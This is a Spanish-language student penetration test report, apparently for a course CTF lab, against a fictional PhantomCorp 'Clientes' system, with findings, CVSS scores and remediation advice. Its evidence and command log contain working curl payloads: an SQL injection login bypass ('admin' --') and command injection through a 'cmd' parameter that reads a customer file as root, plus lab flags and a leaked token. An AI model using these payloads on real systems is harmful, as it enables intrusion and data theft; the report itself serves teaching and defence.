# Informe de Penetration Test — PhantomCorp "Clientes"

**Cliente:** PhantomCorp S.A.  
**Auditor (grupo):** 10

**Integrantes:** Belén Rocío Ramello — @belramello · Carolina Paula Corazza — @carocor1 · Chiara Agustina Kordek — @chiarakordek · Juan Pablo Saby — @JuanSaby

**Fecha:** 06/11/2026 · **Tipo:** Caja negra · **Alcance:** host `phantomcorp` (lab)

---

## 0. Declaración de uso de IA

Se utilizó Claude (Anthropic) como herramienta de asistencia durante el desarrollo del engagement, principalmente para ejecutar solicitudes HTTP y realizar los cálculos matemáticos de los vectores CVSS.

Las decisiones sobre el alcance, el análisis de los hallazgos y la verificación de los resultados contra el manifiesto oficial y mediante `./ctf submit` fueron realizadas y supervisadas por el grupo.

---

## 1. Resumen ejecutivo

- **Qué se hizo:** se realizó una auditoría de caja negra sobre el sistema "Clientes" de PhantomCorp, sin credenciales ni documentación previa y limitada al host `phantomcorp` del laboratorio.

- **Resultado global:** se logró acceder al sistema sin credenciales válidas mediante una inyección SQL en el portal interno. A partir de ese acceso se encontró un archivo de configuración expuesto que contenía un token de API. Con ese token fue posible ejecutar comandos del sistema operativo como `root` y acceder al archivo que contiene los datos de clientes.

- **Riesgo de negocio:** una persona con acceso de red al sistema podría aprovechar esta cadena de vulnerabilidades para acceder a los datos de clientes (nombre, DNI y tarjeta, 48.210 registros según el propio sistema) y ejecutar comandos con privilegios de administrador en el servidor.

- **Recomendación prioritaria:** corregir el endpoint que ejecuta comandos del sistema operativo a partir del parámetro `cmd` (H-01). Esta vulnerabilidad permite ejecutar comandos como `root` una vez obtenido el token de API. También deben corregirse los demás hallazgos para evitar que un atacante pueda llegar a ese punto.

### Resumen de hallazgos

| Severidad | Cantidad de hallazgos |
|---|---:|
| Crítica | 1 |
| Alta | 2 |
| Media | 1 |
| Baja | 0 |

---

## 2. Alcance y metodología

**Alcance:** únicamente el host `phantomcorp` del laboratorio, según las Rules of Engagement del práctico. No se auditó ningún otro host ni se realizaron acciones destructivas. Tampoco se utilizó el token de API para realizar operaciones distintas de las necesarias para comprobar el impacto de la vulnerabilidad.

**Metodología:** se siguieron cuatro etapas:

1. **Reconocimiento y enumeración:** se consultó la página pública y el archivo `robots.txt` para identificar rutas no enlazadas.
2. **Explotación:** se probó una inyección SQL en el formulario de login del portal encontrado para comprobar si era posible acceder sin credenciales válidas.
3. **Post-explotación:** una vez obtenido el acceso, se revisó la información disponible en el portal y se encontró una referencia a un archivo de configuración que contenía credenciales y un token de API.
4. **Impacto:** se utilizó el token para interactuar con un endpoint de la API, comprobar la ejecución de comandos y acceder al archivo con los datos de clientes.

Todas las solicitudes se realizaron con `curl` desde la consola `cyberlab-attacker`, contra el contenedor `cyberlab-phantomcorp`. No se utilizaron herramientas de explotación automatizada ni fuzzers.

---

## 3. Narrativa del ataque

El sitio público de PhantomCorp (`GET /`) mostraba un portal informativo sin enlaces visibles al sistema interno. Al consultar `robots.txt` se encontró la ruta `/portal-rrhh`, indicada como no indexable. Al acceder a ella se encontró un portal de RR.HH. con un formulario de login. Esto permitió completar el primer hito (**R1**, `FLAG{final_recon_portal}`).

En el formulario (`POST /portal/login`), un intento de acceso con credenciales inventadas devolvió `401 Unauthorized`. Luego, al probar el valor `user=admin' --`, la aplicación respondió `200 OK`, mostró un mensaje de bienvenida a `admin` y permitió acceder al Dashboard RRHH. Esto confirmó una inyección SQL que permitía evitar la validación de la contraseña y completar el segundo hito (**R2**, `FLAG{final_sqli_foothold}`).

Dentro del dashboard apareció un mensaje que indicaba la ubicación de un backup de configuración: `/backup/rrhh.conf`. Al consultar esa ruta sin autenticación se obtuvo un archivo de texto plano que contenía credenciales de base de datos y un token de API (`API_TOKEN=phantom-api-7c1e`). También se indicaba cómo utilizarlo en `/api/reporte?token=...&cmd=...`. Con esto se completó el tercer hito (**R3**, `FLAG{final_token_looted}`).

Finalmente, se consultó `GET /api/reporte` sin proporcionar el token y se obtuvo una respuesta `403 Forbidden`. Al repetir la solicitud con el token encontrado y el comando `id`, la aplicación devolvió `uid=0(root) gid=0(root) groups=0(root)`, confirmando que los comandos se ejecutaban con privilegios de administrador.

Mediante los comandos `find` y `cat` se localizó y leyó el archivo `/app/priv/clientes.db.txt`, que contenía 48.210 registros de clientes con nombre, DNI y tarjeta. Esto permitió completar el último hito (**R4**, `FLAG{final_crown_jewels}`).

---

## 4. Hallazgos (detalle técnico)

### H-01 · Ejecución remota de comandos en `/api/reporte` mediante el parámetro `cmd`

- **Severidad:** Crítica · **CVSS:** 9.9 — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`
- **Ubicación:** `GET /api/reporte?token=...&cmd=...`

- **Descripción:** el endpoint recibe el parámetro `cmd` y lo ejecuta directamente en una shell del sistema operativo, sin restricciones sobre los comandos permitidos. Para acceder se necesita un token estático (`API_TOKEN`), que en este caso se obtuvo desde un archivo de configuración expuesto (H-03). Los comandos se ejecutan con los privilegios del proceso del servidor, que en este contenedor es `root`.

- **Evidencia (reproducible):**

```bash
# Sin token: el endpoint rechaza la solicitud.
curl -sS -i -G http://phantomcorp/api/reporte --data-urlencode "cmd=id"

# HTTP/1.0 403 Forbidden
# token invalido; conseguilo del backup de RRHH


# Con el token obtenido en H-03:
curl -sS -i -G http://phantomcorp/api/reporte \
  --data-urlencode "token=phantom-api-7c1e" --data-urlencode "cmd=id"

# HTTP/1.0 200 OK
# $ id
# uid=0(root) gid=0(root) groups=0(root)


# Localización del archivo de clientes:
curl -sS -i -G http://phantomcorp/api/reporte \
  --data-urlencode "token=phantom-api-7c1e" \
  --data-urlencode "cmd=find /app -maxdepth 3 -type f"

# /app/priv/clientes.db.txt
# /app/server.py


# Lectura de los datos:
curl -sS -i -G http://phantomcorp/api/reporte \
  --data-urlencode "token=phantom-api-7c1e" \
  --data-urlencode "cmd=cat /app/priv/clientes.db.txt"

# clientes: 48210 registros (nombre, DNI, tarjeta).
# FLAG{final_crown_jewels}
```

Evidencia completa en `evidencia/07_api_sin_token.txt`, `08_api_token_id.txt`, `09_api_find_app.txt` y `10_api_crown_jewels.txt`.

**Verificación independiente (Juan):** reproduje las cuatro consultas a `/api/reporte` desde el contenedor atacante en una corrida propia. Sin token, el endpoint respondió `HTTP 403 Forbidden`; con el token obtenido en H-03, las consultas devolvieron `HTTP 200 OK`, confirmando la ejecución como `root` (`uid=0(root)`), la localización de `/app/priv/clientes.db.txt` y la lectura de los 48.210 registros junto con `FLAG{final_crown_jewels}`. Evidencia cruda en `evidencia/juan-01-h01.txt`.

- **Impacto:** permite ejecutar comandos del sistema operativo con privilegios de `root`. Durante las pruebas se comprobó la lectura de archivos del servidor, incluido el registro de clientes con 48.210 registros de nombre, DNI y tarjeta.

- **Remediación:** eliminar la ejecución de comandos de shell a partir de datos recibidos del cliente. Si el endpoint necesita realizar operaciones administrativas, implementarlas mediante funciones específicas y una lista de operaciones permitidas. Además, el proceso debe ejecutarse con los menores privilegios posibles y nunca como `root`.

---

### H-02 · Inyección SQL con bypass de autenticación en `/portal/login`

- **Severidad:** Alta · **CVSS:** 7.5 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
- **Ubicación:** `POST /portal/login` (parámetros `user`, `pass`).

- **Descripción:** el formulario de login concatena los valores recibidos en una consulta SQL sin utilizar parámetros. Al enviar `user=admin' --`, se comenta la parte de la consulta que verifica la contraseña y la aplicación permite ingresar como administrador sin conocer una contraseña válida.

- **Evidencia (reproducible):**

```bash
# Intento normal con credenciales inventadas:
curl -sS -i -X POST http://phantomcorp/portal/login -d "user=test&pass=test"

# HTTP/1.0 401 Unauthorized
# Credenciales invalidas


# Payload de inyección SQL:
curl -sS -i -X POST http://phantomcorp/portal/login \
  --data-urlencode "user=admin' --" --data-urlencode "pass=x"

# HTTP/1.0 200 OK
# Bienvenido admin. Dashboard RRHH.
# FLAG{final_sqli_foothold}
# Backup de config disponible en: /backup/rrhh.conf
```

Evidencia previa: `evidencia/04_login_normal.txt` y `evidencia/05_login_sqli.txt`.

**Verificación independiente (Carolina):** reproduje el intento normal y el bypass SQLi en una corrida propia. El intento normal respondió `HTTP 401 Unauthorized`; con `user=admin' --` y contraseña `x`, la respuesta fue `HTTP 200 OK`, mostró el Dashboard RRHH y confirmó `FLAG{final_sqli_foothold}`. Evidencia cruda en `evidencia/carolina-01-h02.txt`.

- **Impacto:** permite acceder al portal interno de RR.HH. como administrador sin credenciales válidas. Además, el dashboard muestra la ubicación de un archivo de configuración que contiene credenciales y un token de API (H-03).

- **Remediación:** reemplazar las consultas SQL concatenadas por consultas parametrizadas, de modo que los valores recibidos no puedan modificar la estructura de la consulta. También se recomienda almacenar las contraseñas mediante hashes seguros con sal y agregar un segundo factor de autenticación para el acceso administrativo.

---

### H-03 · Archivo de configuración con credenciales y token de API accesible sin autenticación

- **Severidad:** Alta · **CVSS:** 7.5 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
- **Ubicación:** `GET /backup/rrhh.conf`

- **Descripción:** el servidor permite descargar un archivo de configuración en texto plano que contiene credenciales de base de datos y un token de API, sin solicitar autenticación. La ubicación del archivo aparece en un mensaje del portal de RR.HH. (H-02), aunque también podría consultarse directamente si se conoce la ruta.

- **Evidencia (reproducible):**

```bash
curl -sS -i http://phantomcorp/backup/rrhh.conf

# HTTP/1.0 200 OK
# DB_USER=rrhh_app
# DB_PASS=Rh-2026
# API_TOKEN=phantom-api-7c1e
# usar el token en /api/reporte?token=...&cmd=...
# FLAG{final_token_looted}
```

Evidencia completa en `evidencia/06_backup_rrhh_conf.txt`.

**Verificación independiente (Chiara, 06/11/2026):** repetí la consulta desde el contenedor atacante y confirmé una respuesta `HTTP 200 OK` sin autenticación, con las credenciales y el token visibles. Salida: `evidencia/17_verificacion_h03_backup.txt`.

- **Impacto:** quedan expuestas las credenciales de la base de datos y un token de API válido. En este caso, el token permite acceder al endpoint vulnerable a ejecución de comandos (H-01).

- **Remediación:** almacenar los archivos de configuración y backups fuera del directorio público del servidor web, con permisos restringidos. Los secretos no deben guardarse en texto plano junto a la aplicación. También se recomienda utilizar variables de entorno o un gestor de secretos y renovar las credenciales y tokens que hayan quedado expuestos.

---

### H-04 · Portal interno de RR.HH. expuesto y descubierto mediante `robots.txt`

- **Severidad:** Media · **CVSS:** 5.3 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`
- **Ubicación:** `GET /robots.txt`, `GET /portal-rrhh`

- **Descripción:** el archivo `robots.txt` indica que la ruta `/portal-rrhh` no debe ser indexada por los buscadores. Sin embargo, esta indicación no restringe el acceso de los usuarios. Al consultar directamente la ruta, el portal interno responde sin aplicar restricciones de red ni autenticación previa.

- **Evidencia (reproducible):**

```bash
curl -sS -i http://phantomcorp/robots.txt

# User-agent: *
# Disallow: /portal-rrhh


curl -sS -i http://phantomcorp/portal-rrhh

# HTTP/1.0 200 OK
# ...Portal interno RRHH...
# FLAG{final_recon_portal}
```

Evidencia completa en `evidencia/02_robots.txt` y `03_portal_rrhh.txt`.

**Verificación independiente (Chiara, 06/11/2026):** confirmé que `robots.txt` anuncia `/portal-rrhh` y que la ruta responde `HTTP 200 OK` directamente, mostrando el portal y la flag R1. Salida: `evidencia/18_verificacion_h04_robots_portal.txt`.

- **Impacto:** permite identificar y acceder a un portal interno que debería estar restringido. Por sí solo no expone datos sensibles, pero constituye el punto de entrada de la cadena de vulnerabilidades encontrada.

- **Remediación:** restringir el acceso al portal mediante VPN, listas de IP permitidas o una red administrativa separada. No se debe utilizar `robots.txt` como mecanismo de seguridad, ya que solamente establece indicaciones para los rastreadores web.

---

## 5. Conclusión

La auditoría permitió identificar cuatro vulnerabilidades que, al combinarse, hicieron posible acceder al portal interno, obtener un token de API y ejecutar comandos en el servidor con privilegios de `root`. Esto también permitió acceder al archivo que contiene los datos de clientes.

La inyección SQL (H-02) fue el punto de entrada de la cadena y su corrección habría evitado continuar con los siguientes pasos a través de ese acceso. Por otro lado, H-01 representa la vulnerabilidad de mayor impacto, ya que permite ejecutar comandos del sistema operativo una vez obtenido el token. Por eso, es importante corregir los cuatro hallazgos y no depender de solucionar únicamente el punto de entrada.

---

## 6. Anexo

### 6.1 Bitácora de comandos

Todas las solicitudes se ejecutaron desde la consola `cyberlab-attacker`, contra el objetivo `phantomcorp`, en la red `cyberlab_labnet`, levantada con:

```bash
docker compose -p cyberlab --project-directory . -f entorno/docker-compose.yml -f labs/labfinal-practico-integrador/entorno/target.compose.yml up -d --build
```

En orden de ejecución:

```bash
# 1. Reconocimiento
curl -sS -i http://phantomcorp/
curl -sS -i http://phantomcorp/robots.txt
curl -sS -i http://phantomcorp/portal-rrhh


# 2. Explotación (SQLi en el login)
curl -sS -i -X POST http://phantomcorp/portal/login -d "user=test&pass=test"

curl -sS -i -X POST http://phantomcorp/portal/login \
  --data-urlencode "user=admin' --" --data-urlencode "pass=x"


# 3. Post-explotación (backup con token de API)
curl -sS -i http://phantomcorp/backup/rrhh.conf


# 4. Impacto (ejecución de comandos con el token)
curl -sS -i -G http://phantomcorp/api/reporte \
  --data-urlencode "cmd=id"

curl -sS -i -G http://phantomcorp/api/reporte \
  --data-urlencode "token=phantom-api-7c1e" \
  --data-urlencode "cmd=id"

curl -sS -i -G http://phantomcorp/api/reporte \
  --data-urlencode "token=phantom-api-7c1e" \
  --data-urlencode "cmd=find /app -maxdepth 3 -type f"

curl -sS -i -G http://phantomcorp/api/reporte \
  --data-urlencode "token=phantom-api-7c1e" \
  --data-urlencode "cmd=cat /app/priv/clientes.db.txt"


# 5. Validación de las flags con el motor oficial
./ctf status final

./ctf submit final R1 'FLAG{final_recon_portal}'
./ctf submit final R2 'FLAG{final_sqli_foothold}'
./ctf submit final R3 'FLAG{final_token_looted}'
./ctf submit final R4 'FLAG{final_crown_jewels}'

./ctf status final
```

No se ejecutaron comandos destinados a modificar o eliminar archivos ni a interrumpir servicios. Las operaciones realizadas mediante el parámetro `cmd` fueron de lectura o consulta (`id`, `find` y `cat`).

### 6.2 Evidencias

Las salidas originales de las solicitudes se encuentran en el directorio `evidencia/`.

| Archivo | Contenido |
|---|---|
| `01_root.txt` | Respuesta de `GET /` |
| `02_robots.txt` | Respuesta de `GET /robots.txt` |
| `03_portal_rrhh.txt` | Respuesta de `GET /portal-rrhh` (R1) |
| `04_login_normal.txt` | Login con credenciales de referencia (401) |
| `05_login_sqli.txt` | Login con el payload de SQLi (R2) |
| `06_backup_rrhh_conf.txt` | Backup con credenciales y token de API (R3) |
| `07_api_sin_token.txt` | `/api/reporte` sin token (403) |
| `08_api_token_id.txt` | `/api/reporte` con token y `cmd=id` |
| `09_api_find_app.txt` | Localización de `clientes.db.txt` |
| `10_api_crown_jewels.txt` | Lectura del archivo de clientes (R4) |
| `11_status_antes.txt` | Estado del laboratorio antes de entregar (0/4) |
| `12_submit_r1.txt` a `15_submit_r4.txt` | Entregas de cada flag, aceptadas por el motor oficial |
| `16_status_despues.txt` | Estado del laboratorio después de entregar (4/4) |

### 6.3 Salida de `./ctf status final`

```text
╭────────────────────────────────────────────────────────────╮
│                   PROGRESO · LAB final                     │
╰────────────────────────────────────────────────────────────╯

 ✓  R1     Recon/enum: portal interno localizado
 ✓  R2     Explotacion: foothold por SQLi
 ✓  R3     Post: token de API looteado
 ✓  R4     Impacto: crown jewels (datos de clientes)

 ██████████████████████████████  4/4 (100%)

[ OK ] ¡Lab final COMPLETO! Ponete las pilas con la próxima unidad.
```
